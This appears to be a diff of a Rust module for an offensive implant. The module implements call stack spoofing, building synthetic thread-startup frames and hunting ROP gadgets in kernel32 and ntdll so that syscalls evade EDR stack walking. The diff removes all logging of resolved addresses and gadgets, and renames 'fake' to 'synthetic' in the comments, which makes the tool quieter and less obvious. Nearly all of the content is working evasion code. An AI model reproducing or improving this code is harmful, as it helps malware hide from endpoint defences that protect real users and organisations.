@@ -3,12 +3,12 @@
 
 //! # Call Stack Spoofing (Synthetic Frames) - Enhanced
 //!
-//! Creates fake call frames to evade EDR stack walking.
+//! Creates synthetic call frames to evade EDR stack walking.
 //! Makes syscalls appear to come from legitimate code paths.
 //!
 //! ## Techniques
 //! - **Dynamic Resolution**: Resolve BaseThreadInitThunk/RtlUserThreadStart at runtime
-//! - **Synthetic Frames**: Build fake stack mimicking Windows thread startup
+//! - **Synthetic Frames**: Build synthetic stack mimicking Windows thread startup
 //! - **Gadget Hunting**: Find JMP/ADD RSP gadgets for control flow
 //!
 //! ## Goal
@@ -18,7 +18,7 @@
 use std::ffi::c_void;
 use std::sync::atomic::{AtomicPtr, Ordering};
 use std::ptr;
-use log::{debug, info, warn};
+
 
 // Cached resolved addresses (using AtomicPtr for thread safety)
 static KERNEL32_BASE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
@@ -154,7 +154,7 @@ pub unsafe fn get_base_thread_init() -> Option<*const c_void> {
     let kernel32 = get_kernel32_base()?;
     let addr = get_export_address(kernel32, b"BaseThreadInitThunk\0")?;
     BASE_THREAD_INIT.store(addr as *mut c_void, Ordering::Relaxed);
-    debug!("[StackSpoof] BaseThreadInitThunk @ {:p}", addr);
+
     Some(addr)
 }
 
@@ -168,7 +168,7 @@ pub unsafe fn get_rtl_user_thread_start() -> Option<*const c_void> {
     let ntdll = get_ntdll_base()?;
     let addr = get_export_address(ntdll, b"RtlUserThreadStart\0")?;
     RTL_USER_THREAD_START.store(addr as *mut c_void, Ordering::Relaxed);
-    debug!("[StackSpoof] RtlUserThreadStart @ {:p}", addr);
+
     Some(addr)
 }
 
@@ -223,7 +223,7 @@ pub unsafe fn get_jmp_rbx_gadget() -> Option<*const c_void> {
     let kernel32 = get_kernel32_base()?;
     let gadget = find_jmp_rbx_gadget(kernel32)?;
     JMP_RBX_GADGET.store(gadget as *mut c_void, Ordering::Relaxed);
-    debug!("[StackSpoof] JMP RBX gadget @ {:p}", gadget);
+
     Some(gadget)
 }
 
@@ -239,7 +239,7 @@ pub unsafe fn get_add_rsp_ret_gadget() -> Option<*const c_void> {
     for offset in [0x38u8, 0x48, 0x28, 0x58, 0x68] {
         if let Some(gadget) = find_add_rsp_ret_gadget(ntdll, offset) {
             ADD_RSP_RET_GADGET.store(gadget as *mut c_void, Ordering::Relaxed);
-            debug!("[StackSpoof] ADD RSP, 0x{:X}; RET gadget @ {:p}", offset, gadget);
+
             return Some(gadget);
         }
     }
@@ -252,7 +252,7 @@ pub unsafe fn get_add_rsp_ret_gadget() -> Option<*const c_void> {
 
 /// Initialize all spoof infrastructure (call once at startup)
 pub unsafe fn init_spoofing() -> bool {
-    info!("[StackSpoof] Initializing stack spoofing infrastructure...");
+
     
     let k32 = get_kernel32_base();
     let ntdll = get_ntdll_base();
@@ -262,10 +262,10 @@ pub unsafe fn init_spoofing() -> bool {
     let add_rsp = get_add_rsp_ret_gadget();
     
     if k32.is_some() && ntdll.is_some() && bti.is_some() && ruts.is_some() && jmp.is_some() {
-        info!("[StackSpoof] All components resolved successfully");
+
         true
     } else {
-        warn!("[StackSpoof] Some components failed to resolve");
+
         false
     }
 }
@@ -349,7 +349,7 @@ pub unsafe fn spoofed_call(
         clobber_abi("system"),
     );
     
-    debug!("[StackSpoof] Call completed, result: 0x{:X}", result);
+
     result
 }
 
